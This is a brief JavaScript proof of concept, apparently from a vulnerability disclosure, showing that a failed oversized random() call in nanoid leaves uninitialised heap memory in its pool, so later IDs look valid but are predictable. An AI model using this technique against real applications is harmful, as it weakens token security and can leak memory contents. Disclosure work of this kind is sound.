import { nanoid, random } from 'nanoid'
// Step 1: Establish pool with small call
random(1) // pool = 128 bytes (CSPRNG-filled), poolOffset = 1
// Step 2: Trigger pool growth past getRandomValues limit
try {
  random(513)
} catch (e) {
  // QuotaExceededError thrown, but pool already replaced with uninit buffer
}
// Step 3: All subsequent calls return heap memory as valid-looking IDs
console.log(nanoid()) // "V9Qttuuu_G2uuuu-uuuuu" — flooded with 'u' (0x00 & 63 = 0, alphabet[0] = 'u')
console.log(nanoid()) // "uueuuuuuuubuuuuuuusuu" — passes format validation
// Verify: raw bytes are heap memory, not CSPRNG
const raw = random(16)
console.log([...raw]) // [0, 24, 37, 0, 0, 0, 0, 0, 0, 24, 37, 0, 0, 0, 0, 0]
// 75% zero bytes = V8 heap object headers. CSPRNG would produce ~0 zeros.
